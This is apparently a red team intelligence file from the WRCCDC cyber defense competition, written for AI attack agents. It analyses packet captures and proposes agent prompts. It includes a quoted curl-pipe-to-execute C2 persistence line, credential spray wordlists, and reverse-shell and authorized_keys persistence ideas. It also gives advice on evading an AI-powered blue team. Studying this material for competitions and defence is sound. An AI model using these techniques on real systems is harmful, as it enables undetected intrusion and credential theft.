# PCAP Intelligence — WRCCDC Competition Traffic Analysis

Maintained by: TRAIN-001 (PCAP Analyst)
Purpose: Structured intelligence extracted from archived WRCCDC packet captures. Organized by extraction category. Findings here feed competition agent prompt improvements through the training debrief cycle. This file accumulates across multiple /analyze-pcap invocations — each analysis run appends under a dated subsection.

---

## Network Topology Patterns

Common WRCCDC network layouts, IP range schemes, host roles, and service profiles observed across competition years. This section feeds RECON-001's "Common CCDC Infrastructure Patterns" knowledge.

### Analysis Run: 2026-03-15 (2026-quals)

**Capture:** 2026-02-07, 08:43–11:17 EST. 851 files x ~319 MB. Linux cooked v2 (SLL2) tap.
**Infrastructure:** Proxmox VE virtual environment (all server .2 hosts share bc:24:11: MAC prefix).

**IP Range Scheme:**
- 10.100.100.0/24 — Shared services segment (10.100.100.6–65 observed)
- 10.100.101–129.0/24 — 29 team subnets (one per participating team)
- 10.2.1.5 — Scoring engine
- 10.193.63.150 — Red team masscan primary
- 10.195.58.63 — Red team masscan secondary
- 10.100.129.141 — Red team Kali jumpbox

**Team Subnet Internal Layout (consistent across all 10.100.1XX.0/24 subnets):**
- .1 = Gateway (unique MAC per subnet, not Proxmox)
- .2 = Primary server (Proxmox VM, bc:24:11: prefix)
- .10, .11 = Secondary servers (SSH open)
- .14 = Domain controller / LDAP server (port 389, NTLM auth)
- .16 = Blue team workstation (connects to github.com)
- .20 = Application server (WordPress, web services)
- .22 = Windows host (WinRM port 5985)
- .23, .24, .26 = Service hosts (SSH)
- .28 = Gaming/scored host (OpenRCT2 game server connects to servers.openrct2.io)
- .100 = Service host (port 5000)
- .240 = Management host (SSH, NTP)

**Scoring Engine (10.2.1.5) Verified Check Targets:**
SSH/22, RDP/3389, HTTP/80, HTTPS/443, port 8080, port 8082 (/mqtt-ws), LDAP/389, port 5000, WordPress (/wordpress/wp-login.php), Victoria domain (/css/status_config.php), WinRM/5985

**ARP-Confirmed Subnets:** 10.100.100–129.0/24 (30 subnets total, all present in ARP table)

**Competition Theme:** Water/hydration (site name "Our Wet Blog", domain rmwpra.hydration, password WaterIsWet??)

---

## Service Configurations

Services consistently observed across multiple competition years, their typical ports, and common configurations. This section feeds RECON-001's target prioritization and EXPLOIT-001's quick-win identification.

### Analysis Run: 2026-03-15 (2026-quals)

**Scored Services (confirmed from scoring engine traffic and SYN-ACK responses):**

| Service | Port | Host Pattern | Notes |
|---|---|---|---|
| SSH | 22 | .2, .10, .11, .20, .23, .24, .26, .240 | Most-checked service |
| RDP | 3389 | .28 | Windows workstations |
| HTTP/WordPress | 80 at /wordpress/ | .20 | Credential: admin:WaterIsWet?? |
| WordPress heartbeat | 80 at /wordpress/wp-admin/admin-ajax.php | .20 | Scoring keep-alive check |
| OpenRCT2 | TLS to servers.openrct2.io | .28 | Game server service check |
| MQTT-WebSocket | 8082 at /mqtt-ws | 10.100.100.26 | IoT/messaging service |
| LDAP | 389 | .14 | Domain controllers |
| WinRM | 5985 | .14, .22 | Windows remote management |
| Victoria domain | 80 at /css/status_config.php | .22 | Custom web app |
| Unknown | 5000 | .100 | One host per team subnet |
| DNS | 53 TCP+UDP | 10.100.103.2 | Shared DNS server |
| HTTPS | 443 | 10.100.103.2, .125.240 | Various |

**Tool Stack Observed on Red Team Kali Host (10.100.129.141):**
burpsuite, python3-impacket, certipy-ad, gvmd (OpenVAS), chromium, gcc-mingw-w64 (cross-compiler),
apache2, avahi-daemon (mDNS discovery)

**External Services in Use:**
- GitHub (10.100.1xx.16 workstations pulling scripts/configs)
- servers.openrct2.io (scored game service — must stay reachable)
- kali.org package mirrors (red team tool downloads)
- Microsoft Update/OCSP (Windows hosts patching/cert validation)

---

## Red Team Traffic Signatures

Scanning patterns, exploitation tool fingerprints, C2 traffic characteristics, and operational cadence observed in past red team traffic. This section feeds EVADE-001's detection surface model — these are the patterns that defenders (and an AI blue team) learn to detect.

### Analysis Run: 2026-03-15 (2026-quals)

**Masscan Signature (10.193.63.150 and 10.195.58.63):**
- Paired SYN packets to same dst host:port ~40 microseconds apart
- No SACK PERM option in SYN (tshark flags this as anomalous)
- Window size: 1024 (constant)
- TTL: 36 (non-standard, forged)
- MSS-only TCP options (no timestamp, no window scale)
- Rate: ~180 pps sustained (~90 unique ports/sec effective)
- Port order: random across entire 0–65535 range
- Primary scanner (10.193.63.150) active the full 2h34m capture window

**SSH Brute Force Signature:**
- Many sources (10+ IPs), each targeting a single team subnet
- Port 22 SYN pairs, 2 per host at ~10ms intervals
- Pattern: sequential host sweep within /24, then RST storm on auth failure
- Most aggressive: 10.237.187.1 at 10:32 (13,028 SYNs against 2 hosts in ~91 seconds)

**NTLM Credential Spray Signature:**
- Multiple source IPs targeting .14 domain controllers on port 389/445
- Domain: rmwpra.hydration
- Usernames: DENIS_FITZGERALD, EVELYN_HOUSTON, BILLIE_HOUSE, CASSANDRA_JOYNER, Administrator, backup
- NULL session attempts (anonymous bind check)
- Sources: 10.234.133.57, 10.194.221.185, 10.203.72.83, 10.229.134.175, 10.247.168.97

**C2 Beacon Signature (HIGHLY DISTINCTIVE):**
- HTTP GET /JSyausLR/LinIUpdater to 10.230.87.61:80
- User-Agent: curl/7.88.1 through curl/8.18.0
- Response: ELF Linux x86-64 binary served as application/octet-stream
- Interval: periodic (cron-based), ~30–60 seconds between beacons
- Hosts exhibiting beacon: 10.100.101.2, 10.100.101.20, 10.100.105.2 (from 09:03);
  10.100.105.20, 10.100.105.240, 10.100.106.23, 10.100.106.26, 10.100.108.23 (from 10:38)
- Detection: trivial via HTTP URI monitoring; the /JSyausLR/ path is unique
- The blue team AI will detect this pattern within seconds of log correlation

**WinRM Lateral Movement Signature:**
- Source: 10.234.234.234 (non-standard /8 IP — likely implant or pivot)
- TCP to port 5985, HTTP POST /wsman
- Targets: team .14 (DC) and .22 (Windows) hosts
- No cleartext credentials visible (NTLM auth inside WinRM)

**Impacket Inferred:**
- WinRM POST pattern + NTLM spray pattern consistent with impacket winrm/smbclient
- certipy-ad downloaded at competition start suggests AD CS attack planned
- No PSExec (PSEXESVC) traffic observed in sampled files

**Red Team IP Space:**
Primary subnets used: 10.193.x.x, 10.194.x.x, 10.195.x.x, 10.201.x.x, 10.203.x.x,
10.223.x.x, 10.229.x.x, 10.230.x.x, 10.232.x.x, 10.234.x.x, 10.237.x.x, 10.242.x.x,
10.247.x.x, 10.248.x.x, 10.249.x.x, 192.168.220.x (VPN range)
Pattern: one red team operator IP per target team subnet in the coordinated phase (10:32 surge)

---

## Blue Team Response Patterns

Defensive actions observed in traffic: firewall deployments, password resets, service restarts, and their timing relative to red team activity. This section feeds OPS-001's phase timing model and EVADE-001's response window estimates.

### Analysis Run: 2026-03-15 (2026-quals)

**SSH Firewall Response (FASTEST OBSERVED):**
- SSH-responding hosts: 43 at 09:03 → 5 at 09:20 (17-minute window)
- Indicates ~17 minutes from scanner onset to firewall rule deployment for most teams
- Several teams appear to have pre-staged firewall rules (immediate drop)
- Teams that blocked SSH early preserved other services; no correlated service outage

**Password Reset (WordPress):**
- Scoring engine login at 11:00: FAILED for team 125 (password changed)
- Scoring engine login at 11:17: SUCCESS for team 104 (default password preserved)
- Minimum time to password change: ~115 minutes from competition start for team 125
- Teams that reset passwords too broadly (including scoring credential) lose points

**C2 Beacon Not Detected:**
- /JSyausLR/LinIUpdater beacon to 10.230.87.61 active from 09:03 through at least 10:38
- No RST or traffic drop to 10.230.87.61 observed = C2 server not blocked
- 8 team hosts actively beaconing for 95+ minutes without blue team intervention
- An AI blue team with log correlation would detect this in the first minute

**RST Patterns (Auth Failure / Service Protection):**
- 10.100.119.28 sent RST storm to 10.223.97.64 at 09:50 after SSH brute force
- Indicates either: fail2ban-style blocking, or SSH service dropping connections
- RST from team host suggests service-level rejection rather than firewall drop (which produces no response)

**Blue Team Hardening Behaviors Observed:**
- Downloading Windows CRL updates (certificate revocation) at 08:43 start
- GitHub connections from .16 workstations (likely pulling hardening scripts)
- Windows hosts running Microsoft Update/OCSP checks
- Teams incrementally bringing up services (scoring checks show staggered availability)

**Response Time Distribution (estimated from service availability deltas):**
- SSH firewall: 15–20 minutes (observed: 09:03 → 09:20)
- WordPress password change: 90–120 minutes (observed: still failed at 11:00 for team 125)
- C2 beacon detection: >115 minutes (no blocking observed in capture window)
- NTLM spray detection: unknown (no clear blue team response to spray traffic visible)

**Blue Team Blind Spot:**
The C2 beacon was a trivial HTTP GET with a distinctive URI and curl user-agent.
An AI blue team (Claude-powered) running log correlation would flag this in real-time.
Human blue teams in this quals missed it for the entire 2.5-hour capture.
Implication for 2026 Regionals: assume AI blue team will detect C2 beaconing within 2 minutes.
EVADE-001 should recommend encrypted C2 with domain fronting or legitimate-looking paths.

---

## Credential Patterns

Cleartext credentials, password schemes, common usernames, and default service account patterns observed across competition years. This section feeds EXPLOIT-001's credential spray strategy and the competition wordlist generator.

### Analysis Run: 2026-03-15 (2026-quals)

**Confirmed Credential (Scoring Engine):**
- Service: WordPress
- Username: admin
- Password: WaterIsWet??
- URL: /wordpress/wp-login.php
- Note: Password follows competition theme (water/hydration). Special chars: ?

**Competition Domain:**
- Domain name: rmwpra.hydration
- Format: random-6-char-word.theme-word
- Theme word: hydration (water theme)

**Username Convention (Active Directory / NTLM spray targets):**
- Format: FIRSTNAME_LASTNAME (all uppercase, underscore separator)
- Observed: DENIS_FITZGERALD, EVELYN_HOUSTON, BILLIE_HOUSE, CASSANDRA_JOYNER
- Service accounts: Administrator, backup
- Pattern: real US names, not sequential (user1, user2)

**Password Scheme Analysis:**
- Observed: WaterIsWet?? (theme word + adjective + special chars)
- Structure: ThemeWord+Adjective+SpecialChars
- Complexity: uppercase start, mixed case, special chars at end
- Length: 12 characters
- Likely pattern family: [ThemeWord][Verb/Adj][Special] or [ThemeWord][Year][Special]

**Wordlist Recommendations for EXPLOIT-001:**
Priority spray list for competition environment (based on 2026-quals data):
1. admin / WaterIsWet??
2. admin / WaterIsWet?
3. admin / WaterIsWet!
4. admin / WaterIsWet
5. Administrator / WaterIsWet??
6. backup / WaterIsWet??
7. [USERNAME] / [FirstName][Year] pattern
8. [USERNAME] / Password1!
9. [USERNAME] / Passw0rd!
10. [USERNAME] / ccdc2026

**High-Value Targets for Credential Attacks:**
- Domain controllers: 10.100.1XX.14 (LDAP/389, SMB/445)
- WordPress: 10.100.1XX.20 /wordpress/ (HTTP cleartext)
- WinRM: 10.100.1XX.22 (port 5985)
- SSH: all hosts in team subnet

**Kali Red Team Tooling (from download traffic):**
certipy-ad was downloaded at competition start, indicating AD Certificate Services (ADCS) attacks
were planned. ADCS ESC1–ESC8 vulnerabilities could yield domain certificates for lateral movement.
This is a high-priority attack path if .14 hosts run ADCS.

---

## Timing Data

Quantitative timing measurements from traffic analysis: scan durations, time between red team phases, blue team response latency distributions, and operational tempo patterns. This section feeds OPS-001's time budget calibrations.

### Analysis Run: 2026-03-15 (2026-quals)

**Competition Start (T=0): 08:43:14**

T+0:00 — Masscan begins immediately (10.193.63.150, ~180 pps)
T+0:00 — Red team Kali box (10.100.129.141) downloading tools (burpsuite, impacket, certipy-ad)
T+19:28 — Secondary masscan (10.195.58.63) starts + C2 first beacon (10.100.105.2 compromised)
T+19:28 — 3 team hosts already compromised (101.2, 101.20, 105.2)
T+29:39 — SSH-targeted scanners appear (10.201.151.129, 10.242.143.7)
T+66:46 — SSH brute force begins (10.223.97.64 against team 119)
T+92:29 — 10.195.58.63 peak burst (37,194 SYNs/91s)
T+109:05 — Major coordinated attack surge: 10+ red team IPs active simultaneously
T+109:05 — NTLM credential spray begins across all team DCs
T+115:08 — C2 beacon spreads to 5 new hosts (teams 105/106/108 lateral expansion)
T+115:08 — WinRM lateral movement begins (10.234.234.234 to team .14/.22 hosts)
T+136:47 — Scoring engine still checking services; WordPress fails for team 125
T+153:55 — Competition capture ends

**Phase Duration Estimates:**
- Initial scan phase: T+0 to T+19 (~19 minutes, masscan only)
- Exploitation phase: T+19 to T+109 (~90 minutes, initial access + brute force)
- Lateral movement phase: T+109 onward (NTLM spray, WinRM, C2 spread)

**Blue Team Response Times:**
- SSH firewall deployment: ~17 minutes after scan onset (09:03 → 09:20)
- C2 detection: NOT detected in 2.5-hour window (human teams)
- WordPress password reset: >115 minutes for at least one team

**Masscan Metrics:**
- Rate: 180.8 pps sustained over 91.4 seconds
- Effective unique ports/sec: ~90 (2 SYNs per port)
- Time to scan all of 10.100.100.0/24 on one port: ~0.6 seconds
- Time to scan full 65535-port range on single host: ~12 minutes

**Scoring Engine Cadence:**
- SSH checks: observed every ~10–15 seconds per host in sampled files
- WordPress checks: observed every ~60 seconds
- Service checks from 10.2.1.5 visible throughout entire capture window

**Operational Window for Initial Access (before SSH firewall):**
Approximately 15–20 minutes from competition start before most teams block external SSH.
This is the critical window for credential spraying and initial compromise.
Red team should prioritize: credential spray on SSH + known-CVE web exploits in first 15 minutes.

**AI Blue Team Adjustment:**
Human teams took 17 minutes to deploy SSH firewall and never detected C2.
An AI blue team (Claude-powered) will likely: block scanning sources within 2–3 minutes,
detect C2 beacon within 1–2 minutes of first request, and reset sprayed accounts within 5 minutes.
OPS-001 should budget 3–5 minutes for initial access window when facing AI blue team.

---

## Recommended Agent Prompt Additions

Specific text blocks proposed for addition to competition agent system prompts, generated by TRAIN-001 after completing PCAP analysis. Each recommendation includes the target agent, the section within the agent's prompt, the proposed text, and the rationale. These recommendations become PROMPT-FIX items in the training debrief cycle.

---

### Analysis Run: 2026-03-15 (2026-quals) — Prompt Recommendations

---

**RECOMMENDATION 1**
Target Agent: RECON-001 (Reconnaissance Specialist)
Target Section: "Common CCDC Infrastructure Patterns" (new subsection)
Rationale: The 2026 quals established a very specific and reusable team subnet layout. RECON-001
should start every engagement by verifying this layout rather than doing a full blind scan.

Proposed Text:
```
## WRCCDC 2026 Network Layout Pattern (observed in 2026-quals)

Each team is assigned a /24 subnet 10.100.1XX.0/24 where XX is the team number (101–129 observed).
All team subnets follow this internal host scheme:
- .1 = Gateway
- .2 = Primary Linux server (Proxmox VM)
- .10, .11 = Secondary servers
- .14 = Windows domain controller (LDAP/389, likely SMB/445, WinRM/5985)
- .16 = Blue team workstation (likely has github.com outbound access)
- .20 = Web application server (WordPress at /wordpress/, HTTP/80)
- .22 = Windows member server (WinRM/5985)
- .23, .24, .26 = Service hosts
- .28 = Workstation-class host (scored gaming service: OpenRCT2 via TLS to servers.openrct2.io)
- .100 = Service host (port 5000, unknown service)
- .240 = Management/NTP host (SSH, NTP client)

Verify this layout with a fast targeted scan before general enumeration.
Priority hosts per team: .2, .14, .20, .22 (highest attack surface).

Shared segment: 10.100.100.0/24 contains services common to all teams.
Scoring engine: 10.2.1.5 (do not interfere with its traffic — disrupts scoring visibility).
```

---

**RECOMMENDATION 2**
Target Agent: RECON-001 (Reconnaissance Specialist)
Target Section: "Scan Recommendations" or top-level scanning strategy
Rationale: Masscan at the observed 2026 rate (~100 pps effective) is detectable and triggers
blue team SSH firewall response within 17 minutes. RECON-001 should recommend lower-rate
targeted scanning for the AI blue team context.

Proposed Text:
```
## Scan Rate Calibration for AI Blue Team

2026-quals data: masscan at 180 pps triggered SSH firewall deployment within 17 minutes by human
blue teams. An AI blue team will respond in 2–3 minutes. Adjust accordingly:

For AI blue team environments:
- Do NOT use masscan at full rate against scored services
- Use targeted nmap -T2 or -T1 against known ports (.14, .20, .22 per team subnet)
- Leverage the known subnet layout to skip discovery: scan 10.100.1XX.2,10,14,20,22,28 directly
- Limit initial scan to most valuable ports: 22, 80, 389, 443, 445, 3389, 5985
- Distribute scan traffic across multiple source IPs to avoid per-source rate limits

Scan timing target: complete initial service enumeration within 5 minutes using targeted approach.
```

---

**RECOMMENDATION 3**
Target Agent: EXPLOIT-001 (Initial Access Specialist)
Target Section: "Credential Spray Strategy"
Rationale: 2026-quals revealed specific credential patterns and the most valuable attack target
is SSH in the first ~15 minutes before firewall rules deploy.

Proposed Text:
```
## 2026 Competition Credential Intelligence

Competition domain (2026 quals): rmwpra.hydration
Domain format pattern: [6-char-random].[theme-word]

Confirmed working credential (scoring engine verified):
- WordPress: admin / WaterIsWet??

Password pattern: [ThemeWord][Adjective/Verb][SpecialChars]
- WaterIsWet?? confirmed
- Try also: WaterIsWet!, WaterIsWet?, WaterIsWet1!, [Theme]Is[Adjective]??

Active Directory usernames (NTLM spray observed):
- FIRSTNAME_LASTNAME format (all uppercase, underscore separator)
- Example names: DENIS_FITZGERALD, EVELYN_HOUSTON, BILLIE_HOUSE, CASSANDRA_JOYNER
- Service accounts: Administrator, backup (high value — always try these first)

Priority targets for credential spray:
1. SSH (port 22) — all .2, .10, .20, .23, .24, .26, .240 hosts — FIRST 15 MINUTES ONLY
2. LDAP/SMB (.14 domain controllers) — NTLM spray after SSH window closes
3. WordPress admin panel (/wordpress/wp-login.php on .20 hosts)
4. WinRM (.22 hosts on port 5985) — after NTLM spray yields valid credentials

Tool fingerprinting note: impacket, certipy-ad, and burpsuite were in the 2026 red team toolkit.
ADCS (certipy-ad) is likely a high-value attack path if .14 hosts run Certificate Services.
```

---

**RECOMMENDATION 4**
Target Agent: EVADE-001 (Evasion and Adaptation Specialist)
Target Section: "Detection Surface Model"
Rationale: 2026-quals provides specific, measurable red team signatures that defenders learn.
EVADE-001 needs these patterns to advise on signature rotation.

Proposed Text:
```
## 2026 Red Team Signatures to Avoid (BURNED PATTERNS)

The following patterns were used in 2026-quals and will be in defender training data:

1. MASSCAN SIGNATURE (high risk):
   - Paired SYNs to same dst:port within 40 microseconds
   - Window size 1024, TTL 36, MSS-only TCP options, no SACK PERM
   - An AI blue team will identify this within seconds of first SYN
   - Mitigation: use nmap -T2 with legitimate TCP options, or distribute via multiple sources

2. C2 BEACON PATTERN (critical risk — trivially detected):
   - HTTP GET /JSyausLR/LinIUpdater with User-Agent: curl/x.y.z
   - Periodic interval (~30–60 seconds), response is raw ELF binary
   - This beacon ran undetected by HUMAN teams for 115 minutes
   - An AI blue team will block this in under 2 minutes via HTTP log correlation
   - Mitigation: HTTPS C2 with legitimate-looking SNI, randomized intervals, binary-in-HTTPS

3. NTLM SPRAY PATTERN (detectable):
   - Multiple sources, same domain, sequential usernames, targeting .14 hosts on port 389
   - Timestamps cluster at 10:32 with 10+ simultaneous source IPs = obvious in log correlation
   - Mitigation: rate limit to 1 auth attempt per 30 seconds per username per source

4. WINRM LATERAL MOVEMENT (moderate risk):
   - POST /wsman from non-standard IP (10.234.234.234)
   - Easily correlated with preceding NTLM spray
   - Mitigation: use legitimate admin IPs if possible, or spread timing from spray

AI Blue Team Additional Mitigations:
- Vary scan source IPs per target team to avoid cross-team correlation
- Use legitimate-looking HTTP paths for any HTTP C2 (e.g., /wp-content/themes/update.php)
- Encrypt all C2 traffic (TLS minimum)
- Avoid curl User-Agent for implant callbacks — use browser or service UA strings
```

---

**RECOMMENDATION 5**
Target Agent: OPS-001 (Tactical Coordinator)
Target Section: "Phase Timing Model" or "Time Budget"
Rationale: 2026-quals provides ground truth on how long each phase takes and what windows exist.

Proposed Text:
```
## 2026 Competition Phase Timing (from traffic analysis)

Observed timeline from 2026 quals (human blue teams):
- T+0:00 — Competition start
- T+0:00 — Scanning begins, tool downloads
- T+19 min — First hosts compromised (SSH brute force / credential spray)
- T+19 min — C2 implant first active on team hosts
- T+20–37 min — Blue teams deploy SSH firewall (43 hosts → 5 responding)
- T+90–109 min — Red team coordinated multi-subnet attack surge
- T+109 min — NTLM spray, WinRM lateral movement
- T+115 min — C2 lateral spread to newly-compromised hosts
- T+>115 min — No blue team C2 detection (entire capture window)

Adjusted timelines for AI blue team (2026 Regionals):
- T+0 — AI blue team immediately begins baseline logging and anomaly detection
- T+0–3 min — Window for undetected initial credential spray (SSH)
- T+2–5 min — AI blue team likely blocks scanning sources and alerts on spray
- T+1–2 min — AI blue team likely detects any HTTP C2 beacon via log correlation
- T+5 min — Initial access window effectively closes unless technique is stealthy

Recommended operational phases for AI blue team:
Phase 1 (T+0 to T+5): Ultra-fast targeted credential spray on SSH using known wordlist;
  simultaneous web service fingerprinting
Phase 2 (T+5 to T+30): Exploit any initial access before detection, deploy encrypted persistence
Phase 3 (T+30+): Operate via encrypted channels, use legitimate-looking traffic, avoid patterns

Critical: The 2026 quals showed human teams took 17 minutes to block SSH.
AI blue team equivalent: 2–3 minutes. Budget accordingly.

Competition scoring: WordPress credential admin:WaterIsWet?? must be preserved for scoring.
Do not change this password if compromising WordPress hosts.
```

---

**RECOMMENDATION 6**
Target Agent: PERSIST-001 (Persistence Engineer)
Target Section: "Persistence Techniques" or implant deployment
Rationale: The 2026 red team used a curl-based cron job to download an ELF implant.
This is a poor persistence technique against an AI blue team. PERSIST-001 needs to know
what was used and why it will fail in 2026 Regionals.

Proposed Text:
```
## 2026 Quals Persistence Technique — DO NOT REUSE

The 2026 quals red team deployed persistence as:
  curl http://10.230.87.61/JSyausLR/LinIUpdater | [execute]
  (repeated via cron at ~30–60 second intervals)

Why this WILL FAIL against AI blue team:
1. HTTP with distinctive URI is logged and trivially correlated
2. Periodic curl with same User-Agent string is a textbook beacon signature
3. No encryption = full payload visibility to any passive monitor
4. ELF binary served over HTTP is flagged by any file-type inspection

Improved persistence approaches for AI blue team environment:
- Use SSH authorized_keys injection (no network beacon required)
- Scheduled task / cron that uses an existing binary (not a download)
- Modify a service startup script to include a reverse shell one-liner
- Use systemd service with Type=oneshot to delay execution
- SSH tunneling for C2 (blends with legitimate SSH traffic)
- If using HTTP C2: HTTPS with valid-looking domain/path, browser UA string, jittered timing
```

---
